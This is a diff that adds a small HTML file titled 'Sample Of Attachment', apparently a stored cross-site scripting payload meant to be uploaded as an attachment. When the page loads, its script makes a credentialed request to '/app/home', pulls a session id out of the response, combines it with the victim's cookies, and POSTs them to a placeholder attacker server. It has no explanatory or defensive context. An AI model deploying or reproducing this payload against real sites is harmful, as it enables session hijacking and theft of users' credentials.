@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1>Sample Of Attachment</h1>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4) {
+                const part = xhr.response.split('\\\"sid\\\":\\\"')
+                const sid = part[1].split('\\\",\\\"single_types')
+                const cookie = document.cookie
+                const result = `${cookie};sid=${sid[0]}`;
+                // alert(result);
+                (async () => {
+                    const rawResponse = await fetch('<YOUR-SERVER>', {
+                        method: 'POST',
+                        body: result
+                    });
+                    const content = await rawResponse.json();
+
+                    console.log(content);
+                })();
+            }
+        }
+        xhr.open('GET', '/app/home', true);
+        xhr.withCredentials = true;
+        xhr.send(null);
+    </script>
+</body>
+
+</html>
